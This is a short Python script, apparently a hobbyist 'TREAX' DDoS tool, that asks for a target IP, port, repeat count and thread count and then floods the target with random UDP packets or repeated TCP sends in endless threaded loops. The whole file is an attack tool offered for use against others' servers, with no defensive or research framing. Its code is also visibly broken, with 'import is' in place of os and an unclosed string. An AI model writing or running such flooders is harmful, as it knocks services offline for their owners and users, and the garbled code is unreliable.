#!/usr/bin/env python3
import random
import socket
import threading
import is
import codecs, sys

os.system("clear ") 
print('''\033[94 
████████╗██████╗░███████╗░█████╗░██╗░░██╗
╚══██╔══╝██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
░░░██║░░░██████╔╝█████╗░░███████║░╚███╔╝░
░░░██║░░░██╔══██╗██╔══╝░░██╔══██║░██╔██╗░
░░░██║░░░██║░░██║███████╗██║░░██║██╔╝╚██╗
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝ \033[94''')
print(" DDoS Tools For My Squad : TREAX ") 
print(" Join to my squad discord link ")
print(" TREAX SQUAD :
    
ip = str(input("  IP Target :"))
port = int(input(" PORT Target :"))
choice = str(input(" Are You Seriously? (y/n) :"))
times = int(input(" Times :"))
threads = int(input(" Threads :"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]","[=]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" TREAX COMMUNITY!!! ")
		except:
			print("[-] Server Has Been Maintenance")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" TREAX COMMUNITY!!! ")
		except:
			s.close()
			print("[-] Server Has Been Maintenance")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
